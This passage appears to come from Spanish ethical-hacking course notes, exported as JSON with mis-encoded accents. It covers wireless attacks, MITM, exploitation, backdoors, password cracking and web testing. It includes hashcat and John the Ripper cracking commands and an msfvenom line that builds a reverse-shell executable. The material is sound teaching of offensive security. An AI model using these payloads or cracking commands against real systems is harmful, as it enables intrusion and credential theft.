inal√°mbricas","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han configurado los distintos modos de funcionamiento de las tarjetas de red inal√°mbricas.\n\nContenido asociado: Modo infraestructura, ad-hoc y monitor.\n\nPr√°cticas:\n\nIntro a redes: tryhackme.com/r/room/whatisnetworking\n\nConceptos\n\nArquitectura IEEE 802.11 y est√°ndares wireless\nDiferencias t√©cnicas entre modos: infraestructura, ad-hoc, monitor\nFuncionalidades de cada modo y casos de uso\nCompatibilidad hardware para modo monitor\n\nPr√°cticas\n\nConfiguraci√≥n de tarjetas en diferentes modos\nCaptura de tr√°fico en modo monitor\nCreaci√≥n de una red ad-hoc segura\n\nMateriales\n\nTarjetas compatibles con modo monitor (Alfa, TP-Link)\nAircrack-ng suite para manipulaci√≥n de interfaces\nWireshark para an√°lisis de capturas\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2b---Comunicaci√≥n-de-redes-inal√°mbricas":{"title":"2b - Comunicaci√≥n de redes inal√°mbricas","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se han descrito las t√©cnicas de encriptaci√≥n de las redes inal√°mbricas y sus puntos vulnerables.\n\nContenido asociado: Comunicaci√≥n inal√°mbrica.\n\nConceptos\n\nEvoluci√≥n de seguridad WiFi: WEP, WPA, WPA2, WPA3\nFuncionamiento de los protocolos de cifrado (RC4, TKIP, AES)\nDebilidades conocidas en cada protocolo\nWPS y sus vulnerabilidades\n\nPr√°cticas\n\nAn√°lisis de tr√°fico cifrado con diferentes protocolos\nIdentificaci√≥n de vulnerabilidades en redes WEP y WPA\nConfiguraci√≥n de una red segura con WPA2/WPA3\n\nMateriales\n\nAircrack-ng para pruebas de seguridad inal√°mbrica\nBettercap para ataques MITM\nWireshark para an√°lisis de paquetes\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2c---Captura-de-tr√°fico-de-redes-inal√°mbricas":{"title":"2c - Captura de tr√°fico de redes inal√°mbricas","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se han detectado redes inal√°mbricas y se ha capturado tr√°fico de red como paso previo a su ataque.\n\nContenido asociado: An√°lisis y recolecci√≥n de datos en redes inal√°mbricas.\n\nPr√°cticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nConceptos\n\nT√©cnicas de wardriving y warwalking\nAn√°lisis de beacon frames e informaci√≥n expuesta\nGeolocalizaci√≥n de redes inal√°mbricas\nHerramientas de mapeo de redes\n\nPr√°cticas\n\nEscaneo de redes inal√°mbricas en diferentes entornos\nIdentificaci√≥n de redes ocultas (SSID hidden)\nCaptura y an√°lisis de handshakes\n\nMateriales\n\nKismet para detecci√≥n y mapeo\nAirodump-ng para captura de tr√°fico\nWIFI Pineapple para pruebas avanzadas\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2d---Ataques-y-exploraci√≥n-de-redes-inal√°mbricas":{"title":"2d - Ataques y exploraci√≥n de redes inal√°mbricas","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se ha accedido a redes inal√°mbricas vulnerables.\n\nContenido asociado: T√©cnicas de ataques y exploraci√≥n de redes inal√°mbricas.\n\nConceptos\n\nVectores de ataque seg√∫n el tipo de encriptaci√≥n\nAtaques de diccionario y fuerza bruta\nAtaques basados en handshake y PMKID\nT√©cnicas de deautenticaci√≥n y evil twin\n\nPr√°cticas\n\nCreaci√≥n de laboratorio de redes vulnerables\nAplicaci√≥n de t√©cnicas de captura de handshake\nAtaque a redes con diferentes configuraciones\n\nMateriales\n\nAircrack-ng suite completa\nHashcat para cracking de handshakes\nWifite para automatizaci√≥n de ataques\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2e---Ataques-a-otros-sistemas-inal√°mbricos":{"title":"2e - Ataques a otros sistemas inal√°mbricos","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han caracterizado otros sistemas de comunicaci√≥n inal√°mbricos y sus vulnerabilidades.\n\nContenido asociado: Ataques a otros sistemas inal√°mbricos.\n\nConceptos\n\nBluetooth: funcionamiento y vulnerabilidades (BlueBorne, KNOB)\nNFC: principios de funcionamiento y ataques comunes\nRFID: tipos de tarjetas y vectores de ataque\nZigBee, Z-Wave: IoT y dom√≥tica\n\nPr√°cticas\n\nAtaques Bluetooth (Bluejacking, Bluesnarfing)\nClonaci√≥n de tarjetas RFID\nAn√°lisis de seguridad en dispositivos IoT dom√©sticos\n\nMateriales\n\nBlueZ, Btlejack para pruebas Bluetooth\nProxmark3 para RFID/NFC\nSoftware y hardware espec√≠fico para IoT (Z-Wave sniffer)\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2f---Equipo-rojo-vs-azul":{"title":"2f - Equipo rojo vs azul","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nf) Se han utilizado t√©cnicas de ‚ÄúEquipo Rojo y Azul‚Äù.\nConceptos\n\nMetodolog√≠as de Red Team vs Blue Team\nT√©cnicas de evasi√≥n de detecci√≥n\nEstrategias defensivas para redes inal√°mbricas\nSimulaci√≥n de adversarios y threat hunting\n\nPr√°cticas\n\nSimulaci√≥n de campa√±a Red Team contra infraestructura wireless\nDetecci√≥n y respuesta a incidentes desde el Blue Team\nEjercicio conjunto de ataque/defensa (Capture The Flag)\n\nMateriales\n\nCobalt Strike/Covenant para operaciones Red Team\nSecurity Onion para defensa Blue Team\nPlataformas de gamificaci√≥n (HackTheBox, CyberDefenders)\ndocs.vectr.io/\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-2/2g---Realizaci√≥n-de-informes-de-auditor√≠a":{"title":"2g - Realizaci√≥n de informes de auditor√≠a","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ng) Se han realizado informes sobre las vulnerabilidades detectadas.\n\nContenido asociado: Realizaci√≥n de informes de auditor√≠a y presentaci√≥n de resultados.\n\nConceptos\n\nEstructura de un informe t√©cnico profesional\nClasificaci√≥n y priorizaci√≥n de vulnerabilidades\nRecomendaciones de mitigaci√≥n espec√≠ficas para WiFi\nComunicaci√≥n efectiva de riesgos t√©cnicos\n\nPr√°cticas\n\nElaboraci√≥n de informes de auditor√≠a wireless\nPresentaci√≥n de resultados a diferentes audiencias\nDesarrollo de plan de mitigaci√≥n para vulnerabilidades encontradas\n\nMateriales\n\nPlantillas profesionales de informes\nHerramientas de visualizaci√≥n de datos\nSoftware de gesti√≥n de vulnerabilidades\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-3/3a---Escaneo-pasivo-(footprinting)":{"title":"3a - Escaneo pasivo (footprinting)","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se ha recopilado informaci√≥n sobre la red y sistemas objetivo mediante t√©cnicas pasivas.\n\nContenido asociado: Fase de reconocimiento (footprinting).\n\nConceptos\n\nOSINT (Open Source Intelligence)\nFootprinting: dominios, DNS, whois\nAn√°lisis de metadatos\nDoxing √©tico y sus implicaciones\n\nPr√°cticas\n\nInvestigaci√≥n de una organizaci√≥n mediante fuentes p√∫blicas\nAn√°lisis de presencia digital y huella digital\nCreaci√≥n de un perfil de organizaci√≥n objetiva\n\nMateriales\n\nThe Harvester, Maltego\nShodan, Censys, ZoomEye\nHerramientas OSINT espec√≠ficas (FOCA, Metagoofil)\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-3/3b---Escaneo-activo-(fingerprinting)":{"title":"3b - Escaneo activo (fingerprinting)","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se ha creado un inventario de equipos, cuentas de usuario y potenciales vulnerabilidades de la red y sistemas objetivo mediante t√©cnicas activas.\n\nContenido asociado: Fase de escaneo (fingerprinting).\n\nPr√°ctica:\n\ntryhackme.com/r/room/networkservices\n\nConceptos\n\nT√©cnicas de escaneo de puertos y servicios\nFingerprinting de sistemas operativos\nEnumeraci√≥n de servicios\nAn√°lisis de banner grabbing\n\nPr√°cticas\n\nEscaneos con diferentes t√©cnicas (SYN, TCP, UDP)\nIdentificaci√≥n de servicios y versiones\nCreaci√≥n de un mapa de red detallado\n\nMateriales\n\nNmap, Masscan\nNessus, OpenVAS\nAquatone para visualizaci√≥n de servicios web\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-3/3c---Monitorizaci√≥n-e-interceptaci√≥n-de-tr√°fico-de-red":{"title":"3c - Monitorizaci√≥n e interceptaci√≥n de tr√°fico de red","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha interceptado tr√°fico de red de terceros para buscar informaci√≥n sensible.\n\nContenido asociado: Monitorizacion de tr√°fico.\nContenido asociado: Interceptaci√≥n de comunicaciones utilizando distintas t√©cnicas.\n\nConceptos\n\nSniffing en redes conmutadas vs. compartidas\nT√©cnicas de envenenamiento ARP\nAtaques MITM en diferentes protocolos\nAn√°lisis de tr√°fico cifrado y no cifrado\n\nPr√°cticas\n\nConfiguraci√≥n de sniffers en diferentes entornos\nCaptura de credenciales en protocolos inseguros\nInterceptaci√≥n de sesiones con diferentes t√©cnicas\n\nMateriales\n\nWireshark, tcpdump\nEttercap, Bettercap\nSSLstrip, sslsplit\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-3/3d---Ataque-de-intermediario-(Man-in-the-Middle)":{"title":"3d - Ataque de intermediario (Man in the Middle)","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se ha realizado un ataque de intermediario, leyendo, insertando y modificando, a voluntad, el tr√°fico intercambiado por dos extremos remotos.\n\nContenido asociado: Manipulaci√≥n e inyecci√≥n de tr√°fico.\n\nConceptos\n\nFuncionamiento detallado de ataques MITM\nT√©cnicas de modificaci√≥n de tr√°fico en tiempo real\nBypass de protecciones SSL/TLS\nImplicaciones de HSTS y HPKP\n\nPr√°cticas\n\nImplementaci√≥n de proxy transparente\nModificaci√≥n de contenido web en tiempo real\nInyecci√≥n de c√≥digo JavaScript en navegaci√≥n\n\nMateriales\n\nMITMproxy, Burp Suite\nResponder para ataques en entornos Windows\nHerramientas de spoofing de DNS y ARP\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-3/3e---Comprometer-sistemas-remotos":{"title":"3e - Comprometer sistemas remotos","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han comprometido sistemas remotos explotando sus vulnerabilidades.\n\nContenido asociado: Herramientas de b√∫squeda y explotaci√≥n de vulnerabilidades.\nContenido asociado: Ingenier√≠a social. Phising.\nContenido asociado: Escalada de privilegios.\n\nConceptos\n\nArquitectura de exploits y payloads\nIngenier√≠a social avanzada\nVectores de ataque comunes\nT√©cnicas de persistencia y escalada\n\nPr√°cticas\n\nExplotaci√≥n de vulnerabilidades en sistemas controlados\nDesarrollo de campa√±as de phishing √©tico\nEjercicios de escalada de privilegios\n\nMateriales\n\nMetasploit Framework\nSET (Social Engineering Toolkit)\nBeEF (Browser Exploitation Framework)\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-4/4a---Administraci√≥n-de-sistemas-de-manera-remota":{"title":"4a - Administraci√≥n de sistemas de manera remota","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han administrado sistemas remotos a trav√©s de herramientas de l√≠nea de comandos.\n\nContenido asociado: Administraci√≥n de sistemas de manera remota.\n\nConceptos\n\nShells remotas (bind vs reverse)\nComunicaci√≥n con sistemas comprometidos\nT√©cnicas de persistencia\nEvasi√≥n de controles de seguridad\n\nPr√°cticas\n\nConfiguraci√≥n de diferentes tipos de shells remotas\nAutomatizaci√≥n de tareas post-explotaci√≥n\nMovimiento lateral dentro de la red\n\nMateriales\n\nNetcat, Socat\nPowerShell Empire, PoshC2\nCobalt Strike (demo educativa)\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-4/4b---Ataques-y-auditor√≠as-de-contrase√±as":{"title":"4b - Ataques y auditor√≠as de contrase√±as","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se han comprometido contrase√±as a trav√©s de ataques de diccionario, tablas rainbow y fuerza bruta contra sus versiones encriptadas.\n\nContenido asociado: Ataques y auditor√≠as de contrase√±as.\n\nConceptos\n\nAtaques online vs offline\nAlgoritmos de hash y sus debilidades\nT√©cnicas de generaci√≥n de diccionarios personalizados\nOptimizaci√≥n de ataques de fuerza bruta\n\nPr√°cticas\n\nExtracci√≥n y an√°lisis de hashes de sistemas Windows/Linux\nCreaci√≥n de tablas rainbow personalizadas\nAtaques de diccionario con reglas personalizadas\n\nMateriales\n\nHashcat, John the Ripper\nMimikatz, LaZagne\nHydra, Medusa para ataques online\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-4/4c---Pivotaje-a-trav√©s-de-sistemas-comprometidos":{"title":"4c - Pivotaje a trav√©s de sistemas comprometidos","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha accedido a sistemas adicionales a trav√©s de sistemas comprometidos.\n\nContenido asociado: Pivotaje en la red.\n\nConceptos\n\nT√©cnicas de pivoting y port forwarding\nEnumeraci√≥n de redes internas\nTrust relationships en dominios\nExplotaci√≥n de confianzas entre sistemas\n\nPr√°cticas\n\nConfiguraci√≥n de tunneling a trav√©s de sistemas comprometidos\nCreaci√≥n de proxies SOCKS y HTTP\nMapeo de redes internas desde sistemas comprometidos\n\nMateriales\n\nProxychains, SSHuttle\nChisel, Ligolo\nMetasploit‚Äôs routing capabilities\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-4/4d---Instalaci√≥n-de-puertas-traseras":{"title":"4d - Instalaci√≥n de puertas traseras","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se han instalado puertas traseras para garantizar accesos futuros a los sistemas comprometidos.\n\nContenido asociado: Instalaci√≥n de puertas traseras con troyanos (RAT, Remote Access Trojan).\n\nConceptos\n\nTipos de backdoors: binarias, web, kernel\nTroyanos de acceso remoto (RATs)\nT√©cnicas de persistencia avanzadas\nEvasi√≥n de antivirus y EDR\n\nPr√°cticas\n\nDesarrollo de backdoors personalizadas\nImplementaci√≥n de persistencia en distintos sistemas\nBypass de sistemas de seguridad\n\nMateriales\n\nCovenant, PoshC2\nMeterpreter, Empire\nTheFatRat, Veil-Framework\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-4/gu√≠as/C-and-C":{"title":"C&C","links":[],"tags":[],"content":"\ngithub.com/its-a-feature/Mythic\ngithub.com/BishopFox/sliver\nCobaltStrike\n"},"ceti/Hacking-√©tico/RA-4/gu√≠as/README-1":{"title":"README 1","links":[],"tags":[],"content":"Post-explotaci√≥n\nDentro de la postexplotaci√≥n encontramos los t√≠picos comandos de linux, como: pwd, whoami, id, sudo -l. Con estos comandos ya nos haremos una idea de en qu√© m√°quina estamos, con qu√© usuario, en qu√© carpeta, y si ese usuario tiene permisos de sudo."},"ceti/Hacking-√©tico/RA-4/gu√≠as/README":{"title":"README","links":[],"tags":[],"content":"Cracking hashes\nPara crackear hashes algunas de las herramientas m√°s relevantes son:\n\nHashcat\nJohn the ripper\n\nPara ver qu√© tipo de hash es podemos usar:\n\nHashcat y que lo reconozca autom√°ticamente\nHaiti\n\nPara hacer ataques con wordlist podemos usar:\n\nRockyou. En Kali en /usr/share/wordlist/rockyou.txt.gz\nSecLists: github.com/danielmiessler/SecLists\n\nPara buscar nuevas wordlist podemos usar:\n\nwordlistctl : github.com/BlackArch/wordlistctl\n\nRecopilaci√≥n de informaci√≥n sobre cracking\ninventory.raw.pm/overview.html"},"ceti/Hacking-√©tico/RA-4/gu√≠as/cewl":{"title":"cewl","links":[],"tags":[],"content":"CEWL\nA veces no tenemos una wordlist clara, pero intuimos que en la p√°gina web puede haber palabras relevantes (keywords). En ese caso podemos usar CEWL (github.com/digininja/CeWL) para ello. Adem√°s podemos indicar con ‚Äú-d‚Äù si queremos que se usen subp√°ginas para generar la wordlist.\ncewl -d 2 -w $(pwd)/wordlist.txt http://URL/index.html"},"ceti/Hacking-√©tico/RA-4/gu√≠as/haiti":{"title":"haiti","links":[],"tags":[],"content":"Haiti\nHaiti es una herramienta que permite la identificaci√≥n de hashes. Enlace a la herramienta: noraj.github.io/haiti/#/\nhaiti &#039;1aec7a56aa08b25b596057e1ccbcb6d768b770eaa0f355ccbd56aee5040e02ee&#039;\nSi a√∫n as√≠ no sacamos qu√© tipo de hash puede ser, o si es alguno poco habitual, podemos usar la web:\nhashcat.net/wiki/doku.php\nEsa web nos permite ver si ese hash incluye algo de prefijo o sufijo. Por ejemplo BLAKE2b-512, que su hash necesita del prefijo BLAKE2.\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"ceti/Hacking-√©tico/RA-4/gu√≠as/hashcat":{"title":"hashcat","links":[],"tags":[],"content":"Hashcat\nEjemplo de uso de hashcat:\nhashcat &#039;48bb6e862e54f2a795ffc4e541caed4d&#039; -m 0 /usr/share/wordlists/rockyou.txt.gz\nDonde:\n\n‚Äò48bb6e862e54f2a795ffc4e541caed4d‚Äô es el hash que quiero descifrar\n-m indica el tipo de encriptado que tiene el hash a desencriptar. Si no se conoce el tipo de encriptado se puede dejar en blanco y hashcat sugerir√° los tipos m√°s probables que puede tener.\n/usr/share/wordlist/rockyou.txt.gz aqu√≠ se indica la wordlist que se desea emplear para romper el cifrado\n\nSi no se indica el par√°metro ‚Äú-a‚Äù se asume que ‚Äú-a 0‚Äù por lo que intentar√° un ataque con una wordlist.\nOtros ejemplos empleados:\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; /usr/share/wordlists/rockyou.txt.gz -m 3200\nhashcat &#039;$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.&#039; /usr/share/wordlist/rockyou.gz.txt\n\nHay que tener en cuenta de este √∫ltimo ejemplo que ‚ÄúaReallyHardSalt‚Äù es la salt del encriptado. Se incluye dentro del cifrado.\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; -a 3 -m 3200 -i --increment-min=4 -1?l ?1?1?1?1\n\nEn este √∫ltimo caso se ha realizado un ataque de fuerza bruta (-a 3) teniendo en cuenta que se comenzara a generar palabras a partir de 4 letras, teniendo en cuenta que el patr√≥n fuera solo de alfab√©tico en min√∫sculas (1?l).\n\n?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?h = 0123456789abcdef\n?H = 0123456789ABCDEF\n?s = ¬´space¬ª!‚Äù#$%&amp;‚Äô()*+,-./:;‚áê&gt;?@[\\]^_`{|}~\n?a = ?l?u?d?s\n?b = 0x00 - 0xff\n\nSi quiero solo min√∫sculas y n√∫meros ser√°: -1?l?d\nPara crackear un sha-1 con salt, hay que a√±adir la salt tras la contrase√±a separado de : (en el siguiente ejemplo la salt es ‚Äútryhackme‚Äù)\nhashcat &#039;e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme&#039; /usr/share/wordlists/rockyou.txt.gz -m 160\nA no tenemos claro cu√°l es el -m que debemos emplear pero s√≠ tenemos el tipo de encriptado. Para buscarlo r√°pidamente podemos emplear:\nhashcat -h | grep -i -e sha1 -e sha-1 | grep salt \nDonde -i permite buscar independientemente de min√∫sculas o may√∫sculas. -e permite realizar una or con grep. Luego el resultado lo filtramos de nuevo para buscar por salt.\nA veces, cuando rompemos el hash queremos comprobar si el resultado se corresponde con la entrada. Para encriptar un texto r√°pidamente desde consola podemos emplear:\necho -n easy | md5sum\nEl -n es fundamental para no a√±adir un salto de l√≠nea en el echo y que el resultado cambie.\nPor otro lado, es posible que rockyou se nos haga una wordlist demasiado amplia. Si conocemos la longitud exacta de caracteres que va a tener la palabra original, podemos aplicar un patr√≥n regex a rockyou para filtrar por las palabras que tengan ese n√∫mero de caracteres exacto. Por ejemplo, para generar una nueva wordlist que tenga todas las palabras de rockyou de 6 caracteres:\ngrep &#039;^......$&#039; /usr/share/wordlists/rockyou.txt &gt; rockyou-6.txt\nAntes de terminar quer√≠a advertir sobre el uso de -f o ‚Äîforce con hashcat. Esa flag debe usarse con cuidado y solo si se tiene claro qu√© se est√° haciendo.\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"ceti/Hacking-√©tico/RA-4/gu√≠as/john-the-ripper":{"title":"john-the-ripper","links":[],"tags":[],"content":"John the ripper\nPara ver el listado de hashes que es capaz de romper john the ripper. Aqu√≠ lo acompa√±amos de un grep para filtrar y mostrar solo el que buscamos.\njohn --list=formats | grep -i Keccak-256\nPara crear reglas personalizadas para john the ripper, crearlas en un archivo /usr/share/john/john-local.conf. Las reglas que se pueden crear est√°n en el enlace: www.openwall.com/john/doc/RULES.shtml. Un ejemplo de regla, para a√±adir dos n√∫meros a las reglas por defecto es la siguiente:\n// En el archivo /usr/share/john/john-local.conf\n[List.Rules:11]\n$[0-9]$[0-9]\n// Para usar las palabras del rev√©s\n[List.Rules:12]\nr\n// Para usar repeticiones de palabras\n[List.Rules:13]\nd\ndd\nddd\n\nSi no se sabe d√≥nde est√° la instalaci√≥n de john the ripper, se puede usar el comando:\nlocate john.conf\nAhora podemos usar la regla creada. En este ejemplo usamos la nueva regla creada y adem√°s usamos las wordlists de la lista de seclists (github.com/danielmiessler/SecLists)\njohn hash.txt --format=raw-sha1 --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --rules=THM01\nM√°quinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"ceti/Hacking-√©tico/RA-4/gu√≠as/msfvenom":{"title":"msfvenom","links":[],"tags":[],"content":"msfvenom\nMSFVenom es una herramienta, dentro del framework de Metasploit, que nos permite generar archivos con payloads dentro. Es decir, en lugar de incluir el payload en un exploit, como har√≠amos con la herramienta msfconsola, el objetivo aqu√≠ es crear un ‚Äúmalware‚Äù que al ejecutarlo lance el payload.\nEste tipo de malware nos puede permitir escalar privilegios.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o reverse.exe"},"ceti/Hacking-√©tico/RA-4/gu√≠as/wordlistctl":{"title":"wordlistctl","links":[],"tags":[],"content":"wordlistctl\nPara descargar una wordlist para nombres de perros, por ejemplo:\nsudo python wordlistctl.py fetch fetch_term -l dogs -d"},"ceti/Hacking-√©tico/RA-5/5a---Autenticaci√≥n-web":{"title":"5a - Autenticaci√≥n web","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han identificado los distintos sistemas de autenticaci√≥n web, destacando sus debilidades y fortalezas.\n\nContenido asociado: Negaci√≥n de credenciales en aplicaciones web.\n\nConceptos\n\nMecanismos de autenticaci√≥n (b√°sica, formularios, token)\nOAuth, SAML, JWT y sus vulnerabilidades\nSistemas MFA y sus bypass\nGesti√≥n de sesiones seguras\n\nPr√°cticas\n\nAn√°lisis de diferentes sistemas de autenticaci√≥n\nExplotaci√≥n de vulnerabilidades comunes en autenticaci√≥n\nImplementaci√≥n de autenticaci√≥n segura\n\nMateriales\n\nJWT_Tool, OAuth Playground\nBurp Suite (Autorize extension)\n2FA Bypass techniques\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/5b---Recolecci√≥n-de-informaci√≥n-web":{"title":"5b - Recolecci√≥n de informaci√≥n web","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se ha realizado un inventario de equipos, protocolos, servicios y sistemas operativos que proporcionan el servicio de una aplicaci√≥n web.\n\nContenido asociado: Recolecci√≥n de informaci√≥n.\n\nConceptos\n\nT√©cnicas de fingerprinting web\nAn√°lisis de tecnolog√≠as subyacentes\nMetodolog√≠as de enumeraci√≥n de servicios web\nDescubrimiento de componentes ocultos\n\nPr√°cticas\n\nIdentificaci√≥n de frameworks, CMS y bibliotecas\nDescubrimiento de versiones y posibles vulnerabilidades\nMapeo de la arquitectura web completa\n\nMateriales\n\nWappalyzer, Builtwith\nWhatweb, webanalyze\nNikto, Nuclei\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/5c---An√°lisis-de-interacciones-con-aplicaciones-web":{"title":"5c - An√°lisis de interacciones con aplicaciones web","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha analizado el flujo de las interacciones realizadas entre el navegador y la aplicaci√≥n web durante su uso normal.\n\nContenido asociado: Automatizaci√≥n de conexiones a servidores web (ejemplo: Selenium).\nContenido asociado: An√°lisis de tr√°fico a trav√©s de proxies de intercepci√≥n.\n\nConceptos\n\nArquitectura cliente-servidor en aplicaciones web\nGesti√≥n de sesiones y cookies\nMecanismos de seguridad en navegadores\nT√©cnicas de automatizaci√≥n de navegaci√≥n\n\nPr√°cticas\n\nConfiguraci√≥n de proxies de intercepci√≥n\nAn√°lisis de solicitudes y respuestas HTTP/HTTPS\nAutomatizaci√≥n de flujos de navegaci√≥n\n\nMateriales\n\nBurp Suite, OWASP ZAP\nSelenium, Puppeteer\nBrowser Developer Tools\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/5d---B√∫squeda-manual-de-vulnerabilidades-web":{"title":"5d - B√∫squeda manual de vulnerabilidades web","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se han examinado manualmente aplicaciones web en busca de las vulnerabilidades m√°s habituales.\n\nContenido asociado: B√∫squeda de vulnerabilidades habituales en aplicaciones web.\n\nConceptos\n\nMetodolog√≠a OWASP para pruebas de seguridad\nVulnerabilidades OWASP Top 10\nT√©cnicas de prueba manual para cada tipo de vulnerabilidad\nBypass de controles de seguridad\n\nPr√°cticas\n\nB√∫squeda manual de vulnerabilidades XSS, CSRF, inyecci√≥n\nAn√°lisis de l√≥gica de negocio y privilegios\nDocumentaci√≥n de hallazgos de seguridad\n\nMateriales\n\nOWASP Testing Guide\nHerramientas manuales (proxies, extensiones de navegador)\nColecci√≥n de payloads (XSS, SQLi, etc.)\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/5e---Herramientas-de-b√∫squeda-de-vulnerabilidades-web":{"title":"5e - Herramientas de b√∫squeda de vulnerabilidades web","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han usado herramientas de b√∫squedas y explotaci√≥n de vulnerabilidades web.\n\nContenido asociado: Herramientas para la explotaci√≥n de vulnerabilidades web.\n\nConceptos\n\nScanners de vulnerabilidades web\nHerramientas especializadas por tipo de vulnerabilidad\nAutomatizaci√≥n de pruebas de seguridad\nLimitaciones de las herramientas autom√°ticas\n\nPr√°cticas\n\nConfiguraci√≥n y ejecuci√≥n de escaneos automatizados\nValidaci√≥n manual de resultados\nExplotaci√≥n de vulnerabilidades con herramientas espec√≠ficas\n\nMateriales\n\nOWASP ZAP, Burp Suite\nNikto, Skipfish\nSQLmap, NoSQLMap, XSSer\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/5f---Herramientas-de-explotaci√≥n-de-vulnerabilidades-web":{"title":"5f - Herramientas de explotaci√≥n de vulnerabilidades web","links":["ceti/Hacking-√©tico/RA-5/gu√≠as/SQLMap"],"tags":[],"content":"Criterio de evaluaci√≥n:\nf) Se ha realizado la b√∫squeda y explotaci√≥n de vulnerabilidades web mediante herramientas software.\nConceptos\n\nIntegraci√≥n de herramientas en un flujo de pentesting\nT√©cnicas avanzadas de explotaci√≥n\nPost-explotaci√≥n en entornos web\nHerramientas espec√≠ficas para cada tipo de vulnerabilidad\n\nPr√°cticas\n\nCreaci√≥n de laboratorio vulnerable (DVWA, WebGoat)\nExplotaci√≥n de vulnerabilidades con herramientas avanzadas\nDesarrollo de exploits personalizados\n\nMateriales\n\nMetasploit Web Modules\nWfuzz, Ffuf para fuzzing\nCadenas de herramientas para explotaci√≥n completa\nWPScan\nHydra\nGobuster / dirb\nSQLMap\n\nEvaluaci√≥n"},"ceti/Hacking-√©tico/RA-5/gu√≠as/SQLMap":{"title":"SQLMap","links":[],"tags":[],"content":"\n\t.reveal { font-size: 1.5em; }\n\t.reveal div { justify-content: flex-start  !important; }\n\t.reveal table { font-size: 0.2em; }\n\t.reveal h1 { font-size: 4em; color: #4169E1; }\n\t.reveal h2 { font-size: 3em; color: #2979FF; }\n\t.reveal h3 { font-size: 2em; color: #1E90FF; }\n\t.reveal p { font-size: 1.5em; color: black; text-align: left; }\n\t.reveal ul { align-self: flex-start;  text-align: justify; margin-left: 4.5em; margin-right: 2em }\n\t.reveal li { text-align: left; }\n\t.footnotes li { font-size: 1em;  color: grey;}\n\t.footnotes p { font-size: 1em;  color: grey;}\n\nSQLMap: Automatizaci√≥n de Inyecciones SQL\n\n1. Introducci√≥n\n1.1 ¬øQu√© es SQLMap?\n\nHerramienta de c√≥digo abierto para automatizar la detecci√≥n y explotaci√≥n de vulnerabilidades de inyecci√≥n SQL.\nDesarrollada en Python.\nSoporta una amplia gama de bases de datos.\n\n1.2 Importancia de las inyecciones SQL\n\nUna de las vulnerabilidades web m√°s comunes y peligrosas.\nPuede llevar a la p√©rdida de datos confidenciales, modificaci√≥n de datos o incluso control total del servidor.\n\n\n2. Funcionalidades Principales\n\nDetecci√≥n de vulnerabilidades de inyecci√≥n SQL.\nExplotaci√≥n de vulnerabilidades para obtener informaci√≥n de la base de datos.\nSoporte para diferentes t√©cnicas de inyecci√≥n SQL (basadas en booleanos, basadas en errores, basadas en tiempo, etc.).\nEnumeraci√≥n de bases de datos, tablas y columnas.\nExtracci√≥n de datos.\nEjecuci√≥n de comandos del sistema operativo.\nSoporte 